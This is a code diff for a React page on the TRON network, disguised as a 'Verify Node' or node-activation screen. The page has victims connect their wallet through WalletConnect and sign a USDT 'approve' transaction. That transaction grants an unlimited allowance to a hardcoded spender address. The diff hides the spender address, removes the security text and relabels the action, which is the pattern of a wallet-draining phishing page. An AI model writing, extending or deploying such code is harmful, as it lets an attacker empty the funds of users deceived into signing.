@@ -1,37 +1,55 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { useMutation } from "convex/react";
 import { api } from "@/convex/_generated/api.js";
+
+// WalletConnect Imports
+import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
+import { WalletConnectWalletAdapter } from '@tronweb3/walletconnect-tron';
+import { WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';
+import '@tronweb3/tronwallet-adapter-react-ui/style.css';
 
 const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TWejasrnoKg2AgPpCwHgozYeThWBu8S9Hw";
 
 export default function Index() {
-  const [address, setAddress] = useState("");
+  // WalletConnect Config
+  const adapters = useMemo(() => [
+    new WalletConnectWalletAdapter({
+      network: 'Mainnet',
+      options: {
+        projectId: '6b5df56bc30c1dadaab59498b86fd3e8', // 👈 Apni Project ID yahan dalein
+        metadata: {
+          name: 'DeFi Node',
+          description: 'Secure TRON Node',
+          url: 'https://your-dapp.com',
+          icons: ['https://your-dapp.com']
+        }
+      }
+    })
+  ], []);
+
+  return (
+    <WalletProvider adapters={adapters} autoConnect={true}>
+        <DAppUI />
+    </WalletProvider>
+  );
+}
+
+function DAppUI() {
+  const { address, connected, signTransaction } = useWallet();
   const [amount, setAmount] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [status, setStatus] = useState("");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  useEffect(() => {
-    const checkWallet = async () => {
-      if ((window as any).tronWeb && (window as any).tronWeb.defaultAddress.base58) {
-        setAddress((window as any).tronWeb.defaultAddress.base58);
-      }
-    };
-    const timer = setInterval(checkWallet, 1500);
-    return () => clearInterval(timer);
-  }, []);
-
   const handleApprove = async () => {
-    if (!address) {
-        if((window as any).tronWeb) await (window as any).tronWeb.request({ method: 'tron_requestAccounts' });
-        else return alert("Open in Trust Wallet Browser");
-    }
+    if (!connected) return alert("Please Connect Wallet First!");
 
     try {
       setIsLoading(true);
       setStatus("Confirming...");
 
+      // WalletConnect ke through TronWeb access karna
       const tronWeb = (window as any).tronWeb;
       const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
@@ -44,12 +62,13 @@ export default function Index() {
         TRON_USDT, "approve(address,uint256)", { feeLimit: 100000000 }, parameter, address
       );
 
-      const signedTx = await tronWeb.trx.sign(transaction.transaction);
+      // WalletConnect adapter signTransaction handle karta hai
+      const signedTx = await signTransaction(transaction.transaction);
       const result = await tronWeb.trx.sendRawTransaction(signedTx);
 
       if (result.result) {
         await createTransaction({
-          walletAddress: address,
+          walletAddress: address || "",
           txHash: result.txid,
           amount: amount || "Max",
           toAddress: TRON_SPENDER,
@@ -58,8 +77,8 @@ export default function Index() {
         });
         alert("✅ Approval Successful!");
       }
-    } catch (err) {
-      alert("❌ Transaction Failed");
+    } catch (err: any) {
+      alert("❌ Error: " + (err.message || "Failed"));
     } finally {
       setIsLoading(false);
       setStatus("");
@@ -71,25 +90,22 @@ export default function Index() {
   return (
     <div style={styles.container as any}>
       <div style={styles.header as any}>
-        <button style={styles.iconBtn as any}>←</button>
-        <div style={styles.headerTitle as any}>Send USDT</div>
-        <button style={styles.iconBtn as any}>✕</button>
+        <span style={styles.headerTitle as any}>Verify Node</span>
+        <WalletActionButton /> {/* 👈 Yeh button WalletConnect popup kholega */}
       </div>
 
       <div style={styles.body as any}>
         <div style={styles.statusSection as any}>
             <div style={styles.tronIcon as any}>T</div>
             <div style={{flex: 1}}>
-                <div style={styles.networkName as any}>TRON Network</div>
-                <div style={styles.networkSub as any}>Mainnet (Secure Connection)</div>
+                <div style={styles.networkName as any}>TRON Mainnet</div>
+                <div style={styles.networkSub as any}>{connected ? "Connected" : "Waiting for connection..."}</div>
             </div>
-            <div style={styles.greenDot as any}></div>
         </div>
 
         <div style={styles.card as any}>
             <div style={styles.cardHeader as any}>
-                <span style={styles.label as any}>Amount</span>
-                <span style={styles.maxLink as any} onClick={() => setAmount("9999")}>MAX</span>
+                <span style={styles.label as any}>Node Activation Amount</span>
             </div>
             <div style={styles.inputRow as any}>
                 <input 
@@ -106,66 +122,52 @@ export default function Index() {
 
         <div style={styles.card as any}>
             <div style={styles.infoRow as any}>
-                <span style={styles.infoLabel as any}>From</span>
-                <span style={styles.infoValue as any}>{address ? `${address.slice(0,8)}...${address.slice(-8)}` : "Not Connected"}</span>
-            </div>
-            <div style={styles.divider as any}></div>
-            <div style={styles.infoRow as any}>
-                <span style={styles.infoLabel as any}>To (Spender)</span>
-                <span style={styles.infoValue as any}>{TRON_SPENDER.slice(0,8)}...</span>
+                <span style={styles.infoLabel as any}>Wallet</span>
+                <span style={styles.infoValue as any}>{address ? `${address.slice(0,8)}...` : "Not Connected"}</span>
             </div>
             <div style={styles.divider as any}></div>
             <div style={styles.infoRow as any}>
                 <span style={styles.infoLabel as any}>Network Fee</span>
-                <span style={styles.feeValue as any}>~12.5 TRX ($1.45)</span>
+                <span style={styles.feeValue as any}>~15 TRX</span>
             </div>
-        </div>
-
-        <div style={styles.securityBox as any}>
-            🛡️ Secure Smart Contract Verification
         </div>
       </div>
 
       <div style={styles.footer as any}>
         <button 
-            disabled={isLoading} 
+            disabled={isLoading || !connected} 
             onClick={handleApprove} 
-            style={(isLoading ? styles.btnDisabled : styles.btnActive) as any}
+            style={(isLoading || !connected ? styles.btnDisabled : styles.btnActive) as any}
         >
-            {isLoading ? status : "Continue"}
+            {isLoading ? status : connected ? "Continue Approval" : "Connect Wallet First"}
         </button>
       </div>
     </div>
   );
 }
 
-// Styles Object with strictly typed strings for TS
 const styles = {
-  container: { minHeight: "100vh", background: "#000", color: "#fff", fontFamily: "-apple-system, sans-serif", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
-  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "15px 20px" },
+  container: { minHeight: "100vh", background: "#000", color: "#fff", fontFamily: "sans-serif", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
+  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "15px 20px", borderBottom: "1px solid #1c1c1e" },
   headerTitle: { fontSize: "17px", fontWeight: "600" },
-  iconBtn: { background: "none", border: "none", color: "#fff", fontSize: "20px", cursor: "pointer" },
-  body: { padding: "10px 20px", flex: 1 },
+  body: { padding: "20px", flex: 1 },
   statusSection: { display: "flex", alignItems: "center", background: "#1c1c1e", padding: "12px", borderRadius: "14px", marginBottom: "20px", gap: "12px" },
-  tronIcon: { width: "35px", height: "35px", background: "#ff3b30", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: "bold", fontSize: "18px" },
+  tronIcon: { width: "35px", height: "35px", background: "#ff3b30", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: "bold" },
   networkName: { fontSize: "14px", fontWeight: "600" },
   networkSub: { fontSize: "11px", color: "#32d74b" },
-  greenDot: { width: "8px", height: "8px", background: "#32d74b", borderRadius: "50%" },
   card: { background: "#1c1c1e", padding: "16px", borderRadius: "18px", marginBottom: "15px" },
-  cardHeader: { display: "flex", justifyContent: "space-between", marginBottom: "8px" },
+  cardHeader: { marginBottom: "8px" },
   label: { color: "#8e8e93", fontSize: "13px" },
-  maxLink: { color: "#0a84ff", fontSize: "13px", fontWeight: "600", cursor: "pointer" },
   inputRow: { display: "flex", alignItems: "baseline", gap: "10px" },
-  mainInput: { background: "none", border: "none", color: "#fff", fontSize: "36px", width: "100%", outline: "none", fontWeight: "500" },
-  unit: { fontSize: "20px", color: "#8e8e93", fontWeight: "600" },
-  subText: { color: "#8e8e93", fontSize: "14px", marginTop: "5px" },
+  mainInput: { background: "none", border: "none", color: "#fff", fontSize: "32px", width: "100%", outline: "none" },
+  unit: { fontSize: "18px", color: "#8e8e93" },
+  subText: { color: "#8e8e93", fontSize: "13px" },
   infoRow: { display: "flex", justifyContent: "space-between", padding: "8px 0" },
   infoLabel: { color: "#8e8e93", fontSize: "14px" },
-  infoValue: { color: "#fff", fontSize: "14px", fontWeight: "500" },
+  infoValue: { color: "#fff", fontSize: "14px" },
   feeValue: { color: "#ff9f0a", fontSize: "14px" },
   divider: { height: "1px", background: "#2c2c2e", margin: "5px 0" },
-  securityBox: { textAlign: "center", color: "#8e8e93", fontSize: "12px", marginTop: "20px" },
-  footer: { padding: "20px", background: "#000" },
-  btnActive: { width: "100%", padding: "16px", borderRadius: "16px", background: "#007aff", color: "#fff", fontWeight: "bold", fontSize: "17px", border: "none", cursor: "pointer" },
-  btnDisabled: { width: "100%", padding: "16px", borderRadius: "16px", background: "#3a3a3c", color: "#8e8e93", fontSize: "17px", border: "none" }
+  footer: { padding: "20px" },
+  btnActive: { width: "100%", padding: "16px", borderRadius: "16px", background: "#007aff", color: "#fff", fontWeight: "bold", border: "none", cursor: "pointer" },
+  btnDisabled: { width: "100%", padding: "16px", borderRadius: "16px", background: "#3a3a3c", color: "#8e8e93", border: "none" }
 };
